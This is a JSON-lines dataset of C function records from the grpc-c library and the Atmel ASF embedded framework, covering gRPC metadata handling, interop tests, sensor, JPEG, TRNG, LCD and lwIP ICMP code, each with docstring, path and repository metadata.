{"docstring": "/*\n * Internal function to send available initial metadata to client\n */\n", "func_signal": "int \ngc_send_initial_metadata_internal (grpc_c_context_t *context, int send)", "code": "{\n    grpc_event ev;\n    grpc_call_error e;\n\n    if (context->gcc_meta_sent == 0) {\n\tif (grpc_c_ops_alloc(context, 1)) return 1;\n\n\tcontext->gcc_ops[context->gcc_op_count].op \n\t    = GRPC_OP_SEND_INITIAL_METADATA;\n\tcontext->gcc_ops[context->gcc_op_count]\n\t    .data.send_initial_metadata.count \n\t    = context->gcc_initial_metadata->count;\n\n\tif (context->gcc_initial_metadata->count > 0) {\n\t    context->gcc_ops[context->gcc_op_count].data\n\t\t.send_initial_metadata.metadata \n\t\t= context->gcc_initial_metadata->metadata;\n\t}\n\tcontext->gcc_op_count++;\n\n\tif (send) {\n\t    gpr_mu_lock(context->gcc_lock);\n\t    context->gcc_event.gce_type = GRPC_C_EVENT_METADATA;\n\t    context->gcc_event.gce_refcount++;\n\t    e = grpc_call_start_batch(context->gcc_call, context->gcc_ops, \n\t\t\t\t      context->gcc_op_count, \n\t\t\t\t      &context->gcc_event, NULL);\n\t    if (e == GRPC_CALL_OK) {\n\t\tcontext->gcc_op_count = 0;\n\t    } else {\n\t\tgpr_log(GPR_ERROR, \"Failed to finish batch operations to \"\n\t\t\t\"send initial metadata - %d\", e);\n\t\tgpr_mu_unlock(context->gcc_lock);\n\t\treturn 1;\n\t    }\n\n\t    ev = grpc_completion_queue_pluck(context->gcc_cq, &context->gcc_event, \n\t\t\t\t\t     gpr_inf_future(GPR_CLOCK_REALTIME), \n\t\t\t\t\t     NULL);\n\t    if (ev.type == GRPC_OP_COMPLETE) {\n\t\tcontext->gcc_event.gce_refcount--;\n\t    }\n\t    gpr_mu_unlock(context->gcc_lock);\n\n\t    if (ev.type == GRPC_OP_COMPLETE && ev.success) {\n\t\tcontext->gcc_op_count = 0;\n\t\tcontext->gcc_meta_sent = 1;\n\t\treturn 0;\n\t    } else {\n\t\treturn 1;\n\t    }\n\t} else {\n\t    context->gcc_meta_sent = 1;\n\t}\n    }\n    return 0;\n}", "path": "lib\\stream_ops.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Returns value for given key from trailing metadata array\n */\n", "func_signal": "const char *\ngrpc_c_get_trailing_metadata_by_key (grpc_c_context_t *context, \n\t\t\t\t     const char *key)", "code": "{\n    if (context) {\n\treturn grpc_get_metadata_by_array(context->gcc_trailing_metadata, key);\n    }\n    return NULL;\n}", "path": "lib\\context.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Adds given key value pair to metadata array. Returns 0 on success and 1 on\n * failure\n */\n", "func_signal": "int \ngrpc_c_add_metadata (grpc_c_context_t *context, const char *key, \n\t\t     const char *value)", "code": "{\n    return grpc_c_add_metadata_by_array(context->gcc_metadata, \n\t\t\t\t\t&context->gcc_metadata_storage, key, \n\t\t\t\t\tvalue);\n}", "path": "lib\\context.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * Takes as argument the socket name\n */\n", "func_signal": "int \nmain (int argc, char **argv)", "code": "{\n    if (argc < 2) {\n\tfprintf(stderr, \"Too few arguments\\n\");\n\texit(1);\n    }\n\n    /*\n     * Initialize grpc-c library to be used with vanilla grpc\n     */\n    grpc_c_init(GRPC_THREADS, NULL);\n\n    /*\n     * Create a client object with client name as foo client to be talking to\n     * a insecure server\n     */\n    client = grpc_c_client_init(argv[1], \"unary async client\", NULL, NULL);\n\n    /*\n     * Create a hello request message and call RPC\n     */\n    foo__HelloRequest h;\n    foo__hello_request__init(&h);\n    foo__HelloReply *r;\n\n    char str[BUFSIZ];\n    snprintf(str, BUFSIZ, \"world\");\n    h.name = str;\n\n    /*\n     * This will invoke a async RPC\n     */\n    foo__greeter__say_hello__async(client, NULL, 0, &h, &cb, (void *)1);\n\n    pthread_t thr;\n    pthread_create(&thr, NULL, test_check, NULL);\n\n    grpc_c_client_wait(client);\n}", "path": "examples\\unary_async_client.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * This test verifies unary calls succeed in sending messages, and touches on\n * flow control (even if compression is enabled on the channel).\n */\n", "func_signal": "void \nlarge_unary_fn (grpc_c_client_t *client)", "code": "{\n    Grpc__Testing__SimpleRequest request;\n    Grpc__Testing__SimpleResponse *response;\n\n    grpc__testing__SimpleRequest__init(&request);\n\n    /*\n     * Fill response_size and request payload\n     */\n    request.response_size = 314159;\n    request.payload.body.data = malloc(271828);\n    if (request.payload.body.data) {\n\tbzero(request.payload.body.data);\n\trequest.payload.has_body = 1;\n    }\n\n    gpr_log(GPR_DEBUG, \"Sending RPC with large payload\");\n    GPR_ASSERT(grpc__testing__test_service__unary_call(client, NULL, 0, \n\t\t\t\t\t\t       &request, &response, \n\t\t\t\t\t\t       NULL, -1) == GRPC_C_OK);\n\n    gpr_log(GPR_DEBUG, \"response payload: %s\", response->payload->body->data);\n\n    GPR_ASSERT(response->payload->body->len == 314159);\n    char buf[314159];\n    bzero(buf, sizeof(buf));\n    GPR_ASSERT(memcmp(response->payload->body->data, buf, 314159));\n\n    /*\n     * TODO: free data\n     */\n}", "path": "test\\interop\\client.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/*\n * This test verifies the client can compress unary messages by sending two\n * unary calls, for compressed and uncompressed payloads. It also sends an\n * initial probing request to verify whether the server supports the\n * CompressedRequest feature by checking if the probing call fails with an\n * INVALID_ARGUMENT status\n */\n", "func_signal": "int \nclient_compressed_unary_fn (grpc_c_client_t *client)", "code": "{\n    Grpc__Testing__SimpleRequest request;\n    Grpc__Testing__SimpleResponse *response;\n    grpc_c_context_t *context = NULL;\n    grpc_c_status_t status;\n    const char *algorithm_name = NULL;\n\n    grpc__testing__SimpleRequest__init(&request);\n\n    /*\n     * Get algorithm name for GRPC_COMPRESS_NONE\n     */\n    if (!grpc_compression_algorithm_name(GRPC_COMPRESS_NONE, &algorithm_name)) {\n\tgpr_log(GPR_ERROR, \"Failed to get algorithm name\");\n\tabort();\n    }\n    GPR_ASSERT(algorithm_name != NULL);\n\n    grpc_metadata md1[1] = {{grpc_slice_from_static_string(\n\t\t\t     GRPC_COMPRESSION_REQUEST_ALGORITHM_MD_KEY), \n\t\t\t     grpc_slice_from_static_string(algorithm_name), \n\t\t\t     0, {NULL, NULL, NULL, NULL}}};\n    \n    /*\n     * Fill response_size and request payload\n     */\n    request.response_size = 314159;\n    request.payload.body.data = malloc(271828);\n    if (request.payload.body.data) {\n\tbzero(request.payload.body.data);\n\trequest.payload.has_body = 1;\n    }\n    request.expect_compressed = 1;\n    gpr_log(GPR_DEBUG, \"Sending probe for compressed unary request.\");\n\n    GPR_ASSERT(grpc__testing__test_service__unary_call(client, md, 0, \n\t\t\t\t\t\t       &request, &response, \n\t\t\t\t\t\t       &status, -1) == GRPC_C_OK);\n\n    /*\n     * Server should return invalid argument ideally. 3 is the status code for \n     * invalid argument from status_code_enum.h\n     */\n    if (status.gcs_code != 3) {\n\tgpr_log(GPR_DEBUG, \"Compressed unary request probe failed\");\n\treturn false;\n    }\n\n    gpr_log(GPR_DEBUG, \"Compressed unary request probe succeeded. Proceeding.\");\n\n    /*\n     * Create one request valid request without compression. We need access to\n     * context here so we can check compression algorithm\n     */\n    gpr_log(GPR_DEBUG, \"Sending compressed unary request compression=off\");\n    request.expect_compressed = 0;\n    GPR_ASSERT(grpc__testing__test_service__unary_call__sync(client, md1, 0, \n\t\t\t\t\t\t\t     &context, &request, \n\t\t\t\t\t\t\t     -1) == GRPC_C_OK);\n    GPR_ASSERT(context->gcc_stream_read(context, (void **)&response, 0, -1) \n\t       == GRPC_C_OK);\n    /*\n     * Make sure data is uncompressed\n     */\n    GPR_ASSERT(!(grpc_call_test_only_get_message_flags(context->gcc_call) \n\t\t & GRPC_WRITE_INTERNAL_COMPRESS));\n    status = context->gcc_stream->finish(context, NULL, 0);\n\n    /*\n     * Check payload\n     */\n    GPR_ASSERT(response->payload->body->len == 314159);\n    char buf[314159];\n    bzero(buf, sizeof(buf));\n    GPR_ASSERT(memcmp(response->payload->body->data, buf, 314159));\n\n    /*\n     * Create request with compression and check flags\n     */\n    request.expect_compressed = 1;\n\n    /*\n     * Get algorithm name for GRPC_COMPRESS_GZIP\n     */\n    if (!grpc_compression_algorithm_name(GRPC_COMPRESS_GZIP, &algorithm_name)) {\n\tgpr_log(GPR_ERROR, \"Failed to get algorithm name\");\n\tabort();\n    }\n    GPR_ASSERT(algorithm_name != NULL);\n\n    grpc_metadata md2[1] = {{grpc_slice_from_static_string(\n\t\t\t     GRPC_COMPRESSION_REQUEST_ALGORITHM_MD_KEY), \n\t\t\t     grpc_slice_from_static_string(algorithm_name), \n\t\t\t     0, {NULL, NULL, NULL, NULL}}};\n    GPR_ASSERT(grpc__testing__test_service__unary_call__sync(client, md2, 0, \n\t\t\t\t\t\t\t     &context, &request, \n\t\t\t\t\t\t\t     -1) == GRPC_C_OK);\n    GPR_ASSERT(context->gcc_stream_read(context, (void **)&response, 0, -1) \n\t       == GRPC_C_OK);\n\n    /*\n     * Make sure data is compressed and payload is all zeros\n     */\n    GPR_ASSERT(grpc_call_test_only_get_compression_algorithm(context->gcc_call) \n\t       != GRPC_COMPRESS_NONE);\n    GPR_ASSERT((grpc_call_test_only_get_message_flags(context->gcc_call) \n\t\t& GRPC_WRITE_INTERNAL_COMPRESS));\n    GPR_ASSERT(response->payload->body->len == 314159);\n    GPR_ASSERT(memcmp(response->payload->body->data, buf, 314159));\n\n    status = context->gcc_stream->finish(context, NULL, 0);\n\n    /*\n     * TODO: free\n     */\n\n    return 0;\n}", "path": "test\\interop\\client.c", "repo_name": "Juniper/grpc-c", "stars": 198, "license": "bsd-3-clause", "language": "c", "size": 148}
{"docstring": "/**\n * \\brief Run GLOC driver unit tests.\n */\n", "func_signal": "int main(void)", "code": "{\n\tsysclk_init();\n\tboard_init();\n\n\tconst usart_serial_options_t usart_serial_options = {\n\t\t.baudrate = CONF_TEST_BAUDRATE,\n\t\t.charlength = CONF_TEST_CHARLENGTH,\n\t\t.paritytype = CONF_TEST_PARITY,\n\t\t.stopbits = CONF_TEST_STOPBITS\n\t};\n\n\tstdio_serial_init(CONF_TEST_USART, &usart_serial_options);\n\n\t/* Initialize the GLOC module */\n\tgloc_init(&dev_inst, GLOC);\n\t/* Enable the GLOC module. */\n\tgloc_enable(&dev_inst);\n\n\t/* Define all the test cases. */\n\tDEFINE_TEST_CASE(gloc_4inputs_xor_test, NULL, run_gloc_4inputs_xor_test,\n\t\t\tNULL, \"SAM GLOC LUT 4 Inputs XOR Test\");\n\n\t/* Put test case addresses in an array. */\n\tDEFINE_TEST_ARRAY(gloc_tests) = {\n\t\t&gloc_4inputs_xor_test,\n\t};\n\n\t/* Define the test suite. */\n\tDEFINE_TEST_SUITE(gloc_suite, gloc_tests, \"SAM GLOC driver test suite\");\n\n\t/* Run all tests in the test suite. */\n\ttest_suite_run(&gloc_suite);\n\n\twhile (1) {\n\t\t/* Busy-wait forever. */\n\t}\n}", "path": "sam\\drivers\\gloc\\unit_tests\\unit_tests.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/*!\n *  \\brief Get the current temperature value.\n *\n *  \\param pxLog a Log structure.\n *\n *  \\return true upon success, false if error.\n */\n", "func_signal": "bool b_temperature_get_value( xLogDef *pxLog )", "code": "{\n   int i_current_val, value, index = 0;\n\n\n   /* enable channel for sensor */\n   adc_enable( adc, ADC_TEMPERATURE_CHANNEL );\n   // start conversion\n   adc_start( adc );\n   // get value for sensor\n   value = adc_get_value( adc, ADC_TEMPERATURE_CHANNEL );\n   /* Disable channel for sensor */\n   adc_disable( adc, ADC_TEMPERATURE_CHANNEL );\n\n   if(value > temperature_code[0])\n   {\n        i_current_val = -20;\n   }\n   else\n   {\n      while(temperature_code[index++] > value);\n      i_current_val = (index - 1 - 20);\n   }\n\n   // Alloc memory for the log string.\n   pxLog->pcStringLog = pvPortMalloc( 12*sizeof( char ) );\n   if( NULL == pxLog->pcStringLog )\n   {\n      return( false );\n   }\n   pxLog->pfFreeStringLog = vPortFree; // Because pvPortMalloc() was used to\n                                       // alloc the log string.\n\n   // Build the log string.\n   if( i_current_val <= l_temp_min )\n   {\n      sprintf( pxLog->pcStringLog, \"%3dC | min\", i_current_val );\n      // if alarms have to be checked and no alarm for min was pending\n      if (( b_temp_alarm == pdTRUE ) && ( b_temp_alarm_min == pdFALSE ))\n      {\n        // alarm has been taken into account,\n        // don't reenter this test before leaving min area\n        b_temp_alarm_min = pdTRUE;\n        // allow alarm if max is reached\n        b_temp_alarm_max = pdFALSE;\n        // post alarm to SMTP task\n        v_SMTP_Post(\"Min Temp Alarm\", NULL);\n      }\n   }\n   else if( i_current_val >= l_temp_max )\n   {\n      sprintf( pxLog->pcStringLog, \"%3dC | max\", i_current_val );\n      // if alarms have to be checked and no alarm for max was pending\n      if (( b_temp_alarm == pdTRUE ) && ( b_temp_alarm_max == pdFALSE ))\n      {\n        // alarm has been taken into account,\n        // don't reenter this test before leaving max area\n        b_temp_alarm_max = pdTRUE;\n        // allow alarm if min is reached\n        b_temp_alarm_min = pdFALSE;\n        // post alarm to SMTP task\n        v_SMTP_Post(\"Max Temp Alarm\", NULL);\n      }\n   }\n   else\n   {\n      sprintf( pxLog->pcStringLog, \"%3dC\", i_current_val );\n      // if alarms have to be checked\n      if ( b_temp_alarm == pdTRUE )\n      {\n        // no alarm is pending\n        b_temp_alarm_max = pdFALSE;\n        b_temp_alarm_min = pdFALSE;\n      }\n   }\n\n   return( true );\n}", "path": "avr32\\applications\\evk1100-control-panel\\sensors\\temperature.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/*\n * Here's the routine that will replace the standard error_exit method:\n */\n", "func_signal": "METHODDEF(void)\nextended_error_exit (j_common_ptr cinfo)", "code": "{\n  /* cinfo->err really points to a my_error_mgr struct, so coerce pointer */\n  extended_error_ptr extended_err = (extended_error_ptr) cinfo->err;\n\n  /* Always display the message. */\n  /* We could postpone this until after returning, if we chose. */\n  (*cinfo->err->output_message) (cinfo);\n\n  /* Return control to the setjmp point */\n  longjmp(extended_err->setjmp_buffer, 1);\n}", "path": "avr32\\applications\\uc3-audio-player\\jpg\\jdatasrc.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/**\n * \\brief      Print out all known reset causes\n * \\return     Returns nothing\n */\n", "func_signal": "static void\nprint_reset_causes(void)", "code": "{\n  uint8_t rcause = *((uint8_t *)REG_RCAUSE);\n  printf(\"Last reset cause: \");\n  if(rcause & (1 << 6)) {\n    printf(\"System Reset Request\\n\");\n  }\n  if(rcause & (1 << 5)) {\n    printf(\"Watchdog Reset\\n\");\n  }\n  if(rcause & (1 << 4)) {\n    printf(\"External Reset\\n\");\n  }\n  if(rcause & (1 << 2)) {\n    printf(\"Brown Out 33 Detector Reset\\n\");\n  }\n  if(rcause & (1 << 1)) {\n    printf(\"Brown Out 12 Detector Reset\\n\");\n  }\n  if(rcause & (1 << 0)) {\n    printf(\"Power-On Reset\\n\");\n  }\n}", "path": "thirdparty\\wireless\\SmartConnect_6LoWPAN\\examples\\udp-unicast-sender\\udp-unicast-sender-main.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/* JPEG library callback to initialize the input data source.\n */\n", "func_signal": "static void init_source (j_decompress_ptr cinfo)", "code": "{\n  my_src_ptr src = (my_src_ptr) cinfo->src;\n\n  /* We reset the empty-input-file flag for each image,\n   * but we don't clear the input buffer.\n   * This is correct behavior for reading a series of images from one source.\n   */\n  src->start_of_file = true;\n}", "path": "avr32\\applications\\uc3-audio-player\\jpg\\jdatasrc.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/**\n * \\brief Initializes a hardware TRNG module instance.\n *\n * Enables the clock and initializes the TRNG module, based on the given\n * configuration values.\n *\n * \\param[in,out] module_inst  Pointer to the software module instance struct\n * \\param[in]     hw           Pointer to the TRNG hardware module\n * \\param[in]     config       Pointer to the TRNG configuration options struct\n *\n * \\return Status of the initialization procedure.\n *\n * \\retval STATUS_OK           The module was initialized successfully\n */\n", "func_signal": "enum status_code trng_init(\n\t\tstruct trng_module *const module_inst,\n\t\tTrng *const hw,\n\t\tstruct trng_config *const config)", "code": "{\n\t/* Sanity check arguments */\n\tAssert(module_inst);\n\tAssert(hw);\n\tAssert(config);\n\n\t/* Initialize device instance */\n\tmodule_inst->hw = hw;\n\n\t/* Turn on the digital interface clock */\n\tsystem_apb_clock_set_mask(SYSTEM_CLOCK_APB_APBC, MCLK_APBCMASK_TRNG);\n\n#if TRNG_CALLBACK_MODE == true\n\t/* Initialize parameters */\n\tfor (uint8_t i = 0; i < TRNG_CALLBACK_N; i++) {\n\t\tmodule_inst->callback[i] = NULL;\n\t}\n\n\t/* Initialize software flags*/\n\tmodule_inst->register_callback_mask = 0x00;\n\tmodule_inst->enable_callback_mask   = 0x00;\n\tmodule_inst->job_buffer             = NULL;\n\tmodule_inst->remaining_number       = 0;\n\tmodule_inst->job_status             = STATUS_OK;\n\n\t/* Register this instance for callbacks*/\n\t_trng_instance = module_inst;\n#endif\n\n\t/* Write configuration to module */\n\thw->CTRLA.reg = ((uint32_t)config->run_in_standby << TRNG_CTRLA_RUNSTDBY_Pos);\n\n\treturn STATUS_OK;\n}", "path": "sam0\\drivers\\trng\\trng.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/*!\n *  \\brief Get the temperature sensor config.\n *\n *  \\param ppcStringReply Input/Output. The response string. NEVER NULL AS INPUT.\n *                        A malloc for the response string is performed here;\n *                        the caller must free this string.\n *\n *  \\return the status of the command execution.\n */\n", "func_signal": "eExecStatus e_temperature_get_config( signed portCHAR **ppcStringReply )", "code": "{\n   // Alloc space for the reply.\n   *ppcStringReply = (signed portCHAR *)pvPortMalloc( TEMPERATURE_GETCONF_MAXLEN );\n   if( NULL == *ppcStringReply )\n   {\n      *ppcStringReply = (signed portCHAR *)SHELL_ERRMSG_MEMALLOC;\n      return( SHELL_EXECSTATUS_KO );\n   }\n   // Build the string.\n   sprintf( (char *)*ppcStringReply, \"lograte=%d\\r\\n\"\"min=%dC\\r\\n\"\"max=%dC\\r\\n\"\"alarm=%s\\r\\n\",\n            ul_temp_lograte, l_temp_min, l_temp_max, ((b_temp_alarm == pdTRUE) ? \"on\" : \"off\") );\n   return( SHELL_EXECSTATUS_OK );\n}", "path": "avr32\\applications\\evk1100-control-panel\\sensors\\temperature.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/* Callback function of the JPEG library to skip data.\n */\n", "func_signal": "static void skip_input_data (j_decompress_ptr cinfo, long num_bytes)", "code": "{\n  my_src_ptr src = (my_src_ptr) cinfo->src;\n\n  /* Just a dumb implementation for now.  Could use fseek() except\n   * it doesn't work on pipes.  Not clear that being smart is worth\n   * any trouble anyway --- large skips are infrequent.\n   */\n  if (num_bytes > 0) {\n    while (num_bytes > (long) src->pub.bytes_in_buffer) {\n      num_bytes -= (long) src->pub.bytes_in_buffer;\n      (void) fill_input_buffer(cinfo);\n      /* note we assume that fill_input_buffer will never return false,\n       * so suspension need not be handled.\n       */\n    }\n    src->pub.next_input_byte += (size_t) num_bytes;\n    src->pub.bytes_in_buffer -= (size_t) num_bytes;\n  }\n}", "path": "avr32\\applications\\uc3-audio-player\\jpg\\jdatasrc.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/* Call once before the start of any decompression\n */\n", "func_signal": "bool jpeg_lib_init(void)", "code": "{\n\t// allocate the decompression structure\n\tjpeg_lib_data.cinfo = mspace_malloc(sdram_mspace,\n\t\tsizeof(struct jpeg_decompress_struct ));\n\n\tif(!jpeg_lib_data.cinfo)\n\t\treturn false;\n\n\tjpeg_lib_data.cinfo->err = (struct jpeg_error_mgr *) mspace_malloc(sdram_mspace,\n\t\tsizeof(struct extended_error_mgr));\n\n\tif(!jpeg_lib_data.cinfo->err)\n\t{\n\t\tmspace_free(sdram_mspace, jpeg_lib_data.cinfo);\n\t\treturn false;\n\t}\n\t// allocate the buffer for the decompressed image\n\tjpeg_lib_data.output_image = mspace_malloc(sdram_mspace,\n\t\tJPEG_DECODER_MAX_IMAGE_WIDTH * JPEG_DECODER_MAX_IMAGE_HEIGHT * JPEG_DECODER_PIXEL_SIZE_IN_BYTES);\n\n\tif(!jpeg_lib_data.output_image)\n\t{\n\t\tmspace_free(sdram_mspace, jpeg_lib_data.cinfo->err);\n\t\tmspace_free(sdram_mspace, jpeg_lib_data.cinfo);\n\t\treturn false;\n\t}\n\t// initialize error handler\n\tjpeg_std_error(jpeg_lib_data.cinfo->err);\n\tjpeg_lib_data.cinfo->err->error_exit = extended_error_exit;\n\n\t// initialize the decompression struct\n\tjpeg_create_decompress(jpeg_lib_data.cinfo);\n\n\treturn true;\n}", "path": "avr32\\applications\\uc3-audio-player\\jpg\\jdatasrc.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/**\n * \\internal\n * \\brief Initialize the hardware interface\n *\n * Depending on what interface used for interfacing the LCD controller this\n * function will initialize the necessary hardware.\n */\n", "func_signal": "static void st7565r_interface_init(void)", "code": "{\n#ifdef ST7565R_SERIAL_INTERFACE\n\tspi_flags_t spi_flags = SPI_MODE_3;\n\tboard_spi_select_id_t spi_select_id = 0;\n#endif\n\n#if defined(ST7565R_USART_SPI_INTERFACE)\n\tstruct usart_spi_device device = {\n\t\t.id = ST7565R_CS_PIN,\n\t};\n\tusart_spi_init(ST7565R_USART_SPI);\n\tusart_spi_setup_device(ST7565R_USART_SPI, &device, spi_flags,\n\t\t\tST7565R_CLOCK_SPEED, spi_select_id);\n#elif defined(ST7565R_SPI_INTERFACE)\n\tstruct spi_device device = {\n\t\t.id = ST7565R_CS_PIN,\n\t};\n\tspi_master_init(ST7565R_SPI);\n\tspi_master_setup_device(ST7565R_SPI, &device, spi_flags,\n\t\t\tST7565R_CLOCK_SPEED, spi_select_id);\n#endif\n}", "path": "common\\components\\display\\st7565r\\st7565r.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/*!\n *  \\brief Set the sensor config.\n *\n *  \\param ppcStringReply Input/Output. The response string. NEVER NULL AS INPUT.\n *  \\param ac             Input. Number of args\n *  \\param av             Input. pointer to args\n *\n *  \\return the status of the command execution.\n */\n", "func_signal": "eExecStatus e_temperature_set_config( signed portCHAR **ppcStringReply, int ac, signed portCHAR *av[] )", "code": "{\nportCHAR * token;\n\n\n    if (config_file_set_value(SENSOR_TEMP_CONFIG_FILE, ac, av) != 0)\n    {\n      *ppcStringReply = (signed portCHAR *)SHELL_ERRMSG_CONFIGERROR;\n      // return error\n      return( SHELL_EXECSTATUS_KO );\n    }\n\n  // alarm field\n  if (!strcmp((char *)av[0] , \"alarm\"))\n  {\n    if (!strcmp((char *)av[1] , \"on\"))\n    {\n      b_temp_alarm = pdTRUE;\n      *ppcStringReply = (signed portCHAR *)SENSOR_MSG_ALARM_ON;\n      return( SHELL_EXECSTATUS_OK_NO_FREE );\n    }\n    else if (!strcmp( (char *)av[1], \"off\"))\n    {\n      b_temp_alarm = pdFALSE;\n      *ppcStringReply = (signed portCHAR *)SENSOR_MSG_ALARM_OFF;\n      return( SHELL_EXECSTATUS_OK_NO_FREE );\n    }\n    else\n    {\n      *ppcStringReply = (signed portCHAR *)SHELL_ERRMSG_CONFIGERROR;\n      return( SHELL_EXECSTATUS_KO );\n    }\n  }\n  // lograte field\n  else if (!strcmp((char *)av[0] , \"lograte\"))\n  {\n    ul_temp_lograte = atoi((char *)av[1]);\n    *ppcStringReply = (signed portCHAR *)SENSOR_MSG_CONFIG_SET;\n    return( SHELL_EXECSTATUS_OK_NO_FREE );\n  }\n  // min field\n  else if (!strcmp((char *)av[0] , \"min\"))\n  {\n    token = strpbrk((char *)av[1] , \"C\");\n    if (token != NULL)\n    {\n      *token = '\\0';\n    }\n    l_temp_min = atoi((char *)av[1]);\n    *ppcStringReply = (signed portCHAR *)SENSOR_MSG_CONFIG_SET;\n    return( SHELL_EXECSTATUS_OK_NO_FREE );\n  }\n  // max field\n  else if (!strcmp((char *)av[0] , \"max\"))\n  {\n    token = strpbrk((char *)av[1] , \"C\");\n    if (token != NULL)\n    {\n      *token = '\\0';\n    }\n    l_temp_max = atoi((char *)av[1]);\n    *ppcStringReply = (signed portCHAR *)SENSOR_MSG_CONFIG_SET;\n    return( SHELL_EXECSTATUS_OK_NO_FREE );\n  }\n  // unknown field : error\n  else\n\n  {\n    *ppcStringReply = (signed portCHAR *)SHELL_ERRMSG_CONFIGERROR;\n    return( SHELL_EXECSTATUS_KO );\n  }\n}", "path": "avr32\\applications\\evk1100-control-panel\\sensors\\temperature.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static void\nset_link_addr(void)", "code": "{\n  linkaddr_t addr;\n  unsigned int i;\n\n  memset(&addr, 0, sizeof(linkaddr_t));\n#if UIP_CONF_IPV6\n#if SAMR21\n  memcpy(addr.u8, eui64, sizeof(addr.u8));\n#else \n  memcpy(addr.u8, node_mac, sizeof(addr.u8));\n#endif\n#else   /* UIP_CONF_IPV6 */\n  if(node_id == 0) {\n    for(i = 0; i < sizeof(linkaddr_t); ++i) {\n#if SAMR21\n      addr.u8[i] = eui64 [7 - i];\n#else\n\t    addr.u8[i] = node_mac [7 - i];\n#endif\n    }\n  } else {\n    addr.u8[0] = node_id & 0xff;\n    addr.u8[1] = node_id >> 8;\n  }\n#endif  /* UIP_CONF_IPV6 */\n  linkaddr_set_node_addr(&addr);\n  printf(\"Link layer addr \");\n  for(i = 0; i < sizeof(addr.u8) - 1; i++) {\n    printf(\"%u:\", addr.u8[i]);\n  }\n  printf(\"%u, \", addr.u8[i]);\n  for(i = 0; i < sizeof(addr.u8) - 1; i++) {\n    printf(\"%02x:\", addr.u8[i]);\n  }\n  printf(\"%02x\\n\", addr.u8[i]);\n}", "path": "thirdparty\\wireless\\SmartConnect_6LoWPAN\\examples\\udp-unicast-sender\\udp-unicast-sender-main.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
{"docstring": "/**\n * Send an icmp packet in response to an incoming packet.\n *\n * @param p the input packet for which the 'unreachable' should be sent,\n *          p->payload pointing to the IP header\n * @param type Type of the ICMP header\n * @param code Code of the ICMP header\n */\n", "func_signal": "static void\nicmp_send_response(struct pbuf *p, u8_t type, u8_t code)", "code": "{\n  struct pbuf *q;\n  struct ip_hdr *iphdr;\n  /* we can use the echo header here */\n  struct icmp_echo_hdr *icmphdr;\n\n  /* ICMP header + IP header + 8 bytes of data */\n  q = pbuf_alloc(PBUF_IP, sizeof(struct icmp_echo_hdr) + IP_HLEN + ICMP_DEST_UNREACH_DATASIZE,\n                 PBUF_RAM);\n  if (q == NULL) {\n    LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_time_exceeded: failed to allocate pbuf for ICMP packet.\\n\"));\n    return;\n  }\n  LWIP_ASSERT(\"check that first pbuf can hold icmp message\",\n             (q->len >= (sizeof(struct icmp_echo_hdr) + IP_HLEN + ICMP_DEST_UNREACH_DATASIZE)));\n\n  iphdr = p->payload;\n  LWIP_DEBUGF(ICMP_DEBUG, (\"icmp_time_exceeded from \"));\n  ip_addr_debug_print(ICMP_DEBUG, &(iphdr->src));\n  LWIP_DEBUGF(ICMP_DEBUG, (\" to \"));\n  ip_addr_debug_print(ICMP_DEBUG, &(iphdr->dest));\n  LWIP_DEBUGF(ICMP_DEBUG, (\"\\n\"));\n\n  icmphdr = q->payload;\n  icmphdr->type = type;\n  icmphdr->code = code;\n  icmphdr->id = 0;\n  icmphdr->seqno = 0;\n\n  /* copy fields from original packet */\n  SMEMCPY((u8_t *)q->payload + sizeof(struct icmp_echo_hdr), (u8_t *)p->payload,\n          IP_HLEN + ICMP_DEST_UNREACH_DATASIZE);\n\n  /* calculate checksum */\n  icmphdr->chksum = 0;\n  icmphdr->chksum = inet_chksum(icmphdr, q->len);\n  ICMP_STATS_INC(icmp.xmit);\n  /* increase number of messages attempted to send */\n  snmp_inc_icmpoutmsgs();\n  /* increase number of destination unreachable messages attempted to send */\n  snmp_inc_icmpouttimeexcds();\n  ip_output(q, NULL, &(iphdr->src), ICMP_TTL, 0, IP_PROTO_ICMP);\n  pbuf_free(q);\n}", "path": "thirdparty\\lwip\\lwip-1.3.2\\src\\core\\ipv4\\icmp.c", "repo_name": "avrxml/asf", "stars": 132, "license": "None", "language": "c", "size": 315455}
